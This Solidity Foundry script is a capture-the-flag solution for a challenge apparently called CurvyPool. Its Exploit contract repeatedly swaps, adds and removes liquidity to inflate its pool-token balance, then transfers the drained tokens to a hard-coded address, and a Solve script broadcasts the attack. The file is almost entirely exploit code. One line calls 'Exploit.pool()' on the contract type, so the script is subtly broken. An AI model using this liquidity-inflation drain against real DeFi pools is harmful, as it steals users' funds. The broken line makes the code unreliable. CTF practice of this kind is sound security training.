// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {IERC20} from "../../../src/Backdoor_CTF/CurvyPool/IERC20.sol";
import {Script} from "forge-std/Script.sol";

interface Pool{
    function swap(address _tokenIn, uint256 amountIn) external;
    function addLiquidity(uint256 amount0, uint256 amount1) external;
    function removeLiquidity(uint256 liquidityTokens) external; 
    function balanceOf(address account) external view returns (uint256);
    function getTokens() external view returns (address, address);

}

interface Setup{
    function claimWETH() external;
    function claimPUFETH() external;
    function isSolved(address user) external view returns(bool);
    function pool()external view returns(Pool);
}



contract Exploit {
    Pool public pool;
    Setup public setup;
    IERC20 public token0;
    IERC20 public token1;
    address public USER;
    constructor(address setup_addr,address user_addr){ 
        USER=user_addr;
        setup=Setup(setup_addr);
        pool=setup.pool();
        (address token_0,address token_1)=pool.getTokens();
        token0=IERC20(token_0);
        token1=IERC20(token_1);
    }

    function pwn()public{
        setup.claimWETH();
        setup.claimPUFETH();
        token0.approve(address(pool),type(uint256).max);
        token1.approve(address(pool),type(uint256).max);
        uint256 balance=0;
        while(balance<=10 ether){
            pool.swap(address(token0),token0.balanceOf(address(this)));
            pool.addLiquidity(0,token1.balanceOf(address(this)));
            balance=pool.balanceOf(address(this));
            pool.removeLiquidity(pool.balanceOf(address(this)));
        }

        token0.transfer(USER,token0.balanceOf(address(this)));
        token1.transfer(USER,token1.balanceOf(address(this)));

    }
}

contract Solve is Script{
    function run()public{
        vm.startBroadcast();
        address user=0x170DB3625bffA6d9E5d6c42c8B53E55d145762da;
        address setup_addr=0x46E6ECF3b5150650Bab0FAc6aaa3181398BEFFB1;
        Exploit exploit=new Exploit(setup_addr,user);
        exploit.pwn();
        Pool pool=Exploit.pool();
        Setup setup=Setup(setup_addr);
        exploit.token0().approve(address(pool),type(uint256).max);
        exploit.token1().approve(address(pool),type(uint256).max);
        pool.addLiquidity(exploit.token0().balanceOf(address(msg.sender)),exploit.token1().balanceOf(address(msg.sender)));
        require(setup.isSolved(user),"Exploit Failed");
        vm.stopBroadcast();

    }
}